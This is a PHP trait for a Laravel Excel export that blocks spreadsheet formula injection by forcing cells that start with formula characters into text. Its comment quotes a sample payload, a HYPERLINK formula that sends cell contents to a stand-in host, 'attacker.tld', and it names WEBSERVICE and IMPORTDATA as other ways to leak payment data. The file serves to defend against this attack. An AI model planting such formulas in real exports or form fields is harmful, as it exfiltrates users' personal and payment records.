<?php

namespace App\Exports\Concerns;

use Maatwebsite\Excel\DefaultValueBinder;
use PhpOffice\PhpSpreadsheet\Cell\Cell;
use PhpOffice\PhpSpreadsheet\Cell\DataType;

/**
 * Neutralises spreadsheet formula injection in exported cells.
 *
 * PhpSpreadsheet's default binder types any string beginning with "=" as
 * TYPE_FORMULA (DefaultValueBinder::dataTypeForValue), so the value is written
 * into the sheet as a live formula. Every string mapped into these exports is
 * user-controlled somewhere: a student's name comes from the PUBLIC /admission
 * form, and payment notes, batch names and exam titles are admin-authored.
 *
 * A name of =HYPERLINK("https://attacker.tld/leak?"&MID(A1,50)&"","Click")
 * therefore executed in the accountant's Excel when they opened the export. In
 * PaymentExport the rest of that row holds the registration number, batch,
 * amount, transaction reference and receipt number, which WEBSERVICE and
 * IMPORTDATA variants can exfiltrate — and both fire with macros disabled.
 *
 * A leading apostrophe forces the cell to text. It is only applied when the
 * value is a string that is not itself a number, so genuine negative amounts
 * such as "-500" keep their numeric type.
 */
trait NeutralisesExcelFormulas
{
    /** Characters that make a spreadsheet treat a cell as a formula. */
    private const FORMULA_PREFIXES = ['=', '+', '-', '@', "\t", "\r"];

    public function bindValue(Cell $cell, $value): bool
    {
        if (is_string($value) && $value !== '' && ! is_numeric($value)) {
            if (in_array($value[0], self::FORMULA_PREFIXES, true)) {
                $cell->setValueExplicit("'".$value, DataType::TYPE_STRING);

                return true;
            }
        }

        return (new DefaultValueBinder)->bindValue($cell, $value);
    }
}
